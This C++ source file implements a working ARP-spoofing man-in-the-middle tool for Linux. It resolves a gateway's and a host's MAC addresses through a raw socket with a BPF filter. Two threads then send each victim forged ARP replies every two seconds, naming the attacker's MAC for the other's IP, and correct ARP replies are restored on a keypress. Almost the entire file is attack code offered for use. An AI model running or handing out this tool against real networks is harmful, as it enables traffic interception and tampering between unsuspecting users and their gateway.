#include <Utils.h>
#include <Packet.h>
#include <Filter.h>
#include <CLI.h>

#include <thread>
#include <atomic>

bool inet_address_resolution(Interface &interface,uint32_t tiaddr,uint8_t* thaddr,int attempts = 5);

int main(int n_args,char **args){
	Interface interface;
	if(!cli_read_interface(interface,n_args,args,"--interface","Interface name: ")){
		return 1;
	}

	uint8_t gateway_haddr[MAC_ADDRESS_LENGTH] = {0};
	uint32_t gateway_iaddr = 0;
	if(!cli_read_ipv4(&gateway_iaddr,n_args,args,"--gateway","Gateway IP Address: ")){
		return 1;
	}
	while(true){
		if(!inet_address_resolution(interface,gateway_iaddr,gateway_haddr)){
			printf("Address resolution failed\n");
			return 1;
		}

		break;
	}

	uint8_t host_haddr[MAC_ADDRESS_LENGTH] = {0};
	uint32_t host_iaddr = 0;
	if(!cli_read_ipv4(&host_iaddr,n_args,args,"--host","Host IP Address: ")){
		return 1;
	}
	while(true){
		if(!inet_address_resolution(interface,host_iaddr,host_haddr)){
			printf("Address resolution failed\n");
			return 1;
		}

		break;
	}

	printf("\nInterface Name: %s ",interface.name.c_str());
	printf("IP: %s ",sprint_ipv4(&interface.in_addr));
	printf("MAC: %s\n",sprint_mac(interface.haddr));

	printf("\nGateway IP: %s ",sprint_ipv4(&gateway_iaddr));
	printf("MAC: %s\n",sprint_mac(gateway_haddr));

	printf("\nHost IP: %s ",sprint_ipv4(&host_iaddr));
	printf("MAC: %s\n",sprint_mac(host_haddr));


	int sock = socket(AF_PACKET,SOCK_DGRAM,0);
	if(sock == -1){
		printf("socket: %s\n",strerror(errno));
		return 1;
	}

	sockaddr_ll host_addr = {0};
	host_addr.sll_family = AF_PACKET;
	host_addr.sll_protocol = htons(ETHERNET_ARP);
	host_addr.sll_ifindex = interface.index;
	host_addr.sll_halen = MAC_ADDRESS_LENGTH;
	memcpy(host_addr.sll_addr,host_haddr,host_addr.sll_halen);

	sockaddr_ll gateway_addr = {0};
	gateway_addr.sll_family = AF_PACKET;
	gateway_addr.sll_protocol = htons(ETHERNET_ARP);
	gateway_addr.sll_ifindex = interface.index;
	gateway_addr.sll_halen = MAC_ADDRESS_LENGTH;
	memcpy(gateway_addr.sll_addr,gateway_haddr,gateway_addr.sll_halen);


	auto spoofing_thread = [](int sock,ARP* arp,sockaddr_ll *addr,std::atomic_bool *runner){
		while(runner->load(std::memory_order_acquire)){
			if(sendto(sock,arp->data(),arp->length(),0,(sockaddr*)addr,sizeof(*addr)) == -1){
				printf("sendto failed: %s\n",strerror(errno));
			}
			sleep(2);
		}
	};

	
	std::atomic_bool runner(true);


	ARP host_bad_arp;
	host_bad_arp.write_hdr(ARP_REPLY,interface.haddr,gateway_iaddr,host_haddr,host_iaddr);

	std::thread host_thread(spoofing_thread,sock,&host_bad_arp,&host_addr,&runner);


	ARP gateway_bad_arp;
	gateway_bad_arp.write_hdr(ARP_REPLY,interface.haddr,host_iaddr,gateway_haddr,gateway_iaddr);

	std::thread gateway_thread(spoofing_thread,sock,&gateway_bad_arp,&gateway_addr,&runner);


	printf("\nPrescione qualquer tecla para parar\n");
	clear_stdin();
	(void)getchar();

	runner.store(false,std::memory_order_release);
	
	if(host_thread.joinable()) host_thread.join();
	if(gateway_thread.joinable()) gateway_thread.join();
	

	ARP host_good_arp;
	host_good_arp.write_hdr(ARP_REPLY,gateway_haddr,gateway_iaddr,host_haddr,host_iaddr);

	if(sendto(sock,host_good_arp.data(),host_good_arp.length(),0,(sockaddr*)&host_addr,sizeof(sockaddr_ll)) == -1){
		printf("sendto failed: %s\n",strerror(errno));
	}


	ARP gateway_good_arp;
	gateway_good_arp.write_hdr(ARP_REPLY,host_haddr,host_iaddr,gateway_haddr,gateway_iaddr);

	if(sendto(sock,gateway_good_arp.data(),gateway_good_arp.length(),0,(sockaddr*)&gateway_addr,sizeof(sockaddr_ll)) == -1){
		printf("sendto failed: %s\n",strerror(errno));
	}


	close(sock);
    return 0;
}


bool inet_address_resolution(Interface &interface,uint32_t tiaddr,uint8_t* thaddr,int attempts){
	if(!thaddr || !attempts) return false;

	int sock = socket(AF_PACKET,SOCK_DGRAM,htons(ETHERNET_ARP));
	if(sock == -1){
		printf("function: %s line: %d socket: %s\n",__func__,__LINE__,strerror(errno));
		return false;
	}

	sockaddr_ll saddr = {0};
	saddr.sll_family = AF_PACKET;
	saddr.sll_ifindex = interface.index;
	if(bind(sock,(sockaddr*)&saddr,sizeof(saddr)) == -1){
		printf("function: %s line: %d bind: %s\n",__func__,__LINE__,strerror(errno));
		close(sock);
		return false;
	}

	timeval tv;
	tv.tv_sec = 1e+0;
	tv.tv_usec = 0e+0;
	if(setsockopt(sock,SOL_SOCKET,SO_RCVTIMEO,&tv,sizeof(tv)) == -1){
		printf("function: %s line: %d setsockopt: %s\n",__func__,__LINE__,strerror(errno));
		close(sock);
		return false;
	}

	sock_filter filter[] = {
		//hardware type == ethernet
		{BPF_LD  | BPF_H   | BPF_ABS,0,0,ARP_HARDWARE_TYPE_OFFSET},
		{BPF_JMP | BPF_JEQ | BPF_IMM,0,17,HARDWARE_ETHERNET},
		
		//protocol type == ipv4
		{BPF_LD  | BPF_H   | BPF_ABS,0,0,ARP_PROTOCOL_TYPE_OFFSET},
		{BPF_JMP | BPF_JEQ | BPF_IMM,0,15,ETHERNET_IPV4},
		
		//hardware length == mac address length
		{BPF_LD  | BPF_B   | BPF_ABS,0,0,ARP_HARDWARE_LENGTH_OFFSET},
		{BPF_JMP | BPF_JEQ | BPF_IMM,0,13,MAC_ADDRESS_LENGTH},
		
		//protocol length == ipv4 address length
		{BPF_LD  | BPF_B   | BPF_ABS,0,0,ARP_PROTOCOL_LENGTH_OFFSET},
		{BPF_JMP | BPF_JEQ | BPF_IMM,0,11,IPV4_ADDRESS_LENGTH},
		
		//operation == arp reply
		{BPF_LD  | BPF_H   | BPF_ABS,0,0,ARP_OPERATION_OFFSET},
		{BPF_JMP | BPF_JEQ | BPF_IMM,0,9,ARP_REPLY},
		
		//sender ip == target ip address
		{BPF_LD  | BPF_W   | BPF_ABS,0,0,ARP_SENDER_IP_ADDRESS},
		{BPF_JMP | BPF_JEQ | BPF_IMM,0,7,ntohl(tiaddr)},

		//target hardware address == interface.haddr
		{BPF_LD  | BPF_H   | BPF_ABS,0,0,ARP_TARGET_HADDR_OFFSET + 0},
		{BPF_JMP | BPF_JEQ | BPF_IMM,0,5,READH(interface.haddr + 0)},
		{BPF_LD  | BPF_W   | BPF_ABS,0,0,ARP_TARGET_HADDR_OFFSET + 2},
		{BPF_JMP | BPF_JEQ | BPF_IMM,0,3,READW(interface.haddr + 2)},
		
		//target ip == interface.ip
		{BPF_LD  | BPF_W   | BPF_ABS,0,0,ARP_TARGET_IP_ADDRESS},
		{BPF_JMP | BPF_JEQ | BPF_IMM,0,1,ntohl(interface.in_addr)},

		{BPF_RET | BPF_IMM,0,0,(uint32_t)-1},
		{BPF_RET | BPF_IMM,0,0,0}
	};

	sock_fprog fprog = {sizeof(filter) / sizeof(filter[0]),filter};

	if(setsockopt(sock,SOL_SOCKET,SO_ATTACH_FILTER,&fprog,sizeof(fprog)) == -1){
		printf("function: %s line: %d setsockopt: %s\n",__func__,__LINE__,strerror(errno));
		close(sock);
		return false;
	}

	sockaddr_ll daddr = {0};
	daddr.sll_family = AF_PACKET;
	daddr.sll_protocol = htons(ETHERNET_ARP);
	daddr.sll_ifindex = interface.index;
	daddr.sll_halen = MAC_ADDRESS_LENGTH;
	memset(daddr.sll_addr,0xff,daddr.sll_halen);

	ARP s_arp;
	ARP r_arp;

	s_arp.write_hdr(ARP_REQUEST,interface.haddr,interface.in_addr,nullptr,tiaddr);

	for(int i = 0; i < attempts; ++i){

		if(sendto(sock,s_arp.data(),s_arp.length(),0,(sockaddr*)&daddr,sizeof(daddr)) == -1){
			printf("function: %s line: %d sendto: %s\n",__func__,__LINE__,strerror(errno));
			continue;
		}

		int l = recv(sock,r_arp.data(),r_arp.capacity(),0);
		
		if(l <= 0) continue;

		r_arp.set_length(l);

		ARP::HDR arp_hdr = r_arp.read_hdr();
		memcpy(thaddr,arp_hdr.shaddr,sizeof(arp_hdr.shaddr));

		close(sock);
		return true;
	}

	close(sock);
	return false;
}
